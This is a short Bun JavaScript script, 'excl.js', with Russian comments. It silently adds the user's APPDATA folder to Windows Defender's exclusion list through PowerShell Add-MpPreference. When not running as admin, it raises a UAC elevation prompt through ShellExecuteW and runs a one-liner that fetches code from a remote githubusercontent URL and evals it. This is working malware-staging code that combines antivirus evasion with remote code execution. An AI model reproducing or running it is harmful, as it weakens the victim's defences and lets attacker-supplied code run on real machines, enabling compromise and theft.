// excl.js
(async () => {
  const { dlopen, FFIType, ptr } = await import("bun:ffi");

  const shell32 = dlopen("shell32.dll", {
    ShellExecuteW: {
      args: [FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.i32],
      returns: FFIType.i32,
    },
  });

  const toPtr = (s) => ptr(Buffer.from(s + "\0", "utf16le"));

  const isAdmin = async () => {
    try {
      const p = Bun.spawn({ cmd: ["net", "session"] });
      return (await p.exited) === 0;
    } catch (e) { return false; }
  };

  const is_admin = await isAdmin(); // Объявляем переменную
  console.log(`🚀 PID: ${process.pid} | Admin: ${is_admin}`);

  if (is_admin) {
    const appData = process.env.APPDATA || "C:\\Users\\User\\AppData\\Roaming";
    console.log(`🛡️ Попытка добавить исключение: ${appData}`);

    // Запускаем PowerShell и ЧИТАЕМ ошибки
    const ps = Bun.spawn({
      cmd: ["powershell", "-Command", `Add-MpPreference -ExclusionPath '${appData}' -ErrorAction Stop`],
      stdout: "pipe",
      stderr: "pipe"
    });

    const out = await new Response(ps.stdout).text();
    const err = await new Response(ps.stderr).text();

    if (err) {
      console.log("❌ ОШИБКА DEFENDER:");
      console.log(err.trim()); 
      console.log("\n💡 Если видишь 'Access Denied', значит включен Tamper Protection.");
    } else {
      console.log("✅ УСПЕХ: Исключение должно быть добавлено.");
    }

    console.log("\nНажми Enter для выхода...");
    for await (const line of console) break;
    return;
  }

  console.log("❌ Не админ. Запрос UAC...");
  const url = "https://githubusercontent.com";
  const payload = `bun -e "fetch('${url}').then(r=>r.text()).then(eval)"`;

  shell32.symbols.ShellExecuteW(0, toPtr("runas"), toPtr("cmd.exe"), toPtr("/k " + payload), 0, 1);
  process.exit(0);
})();
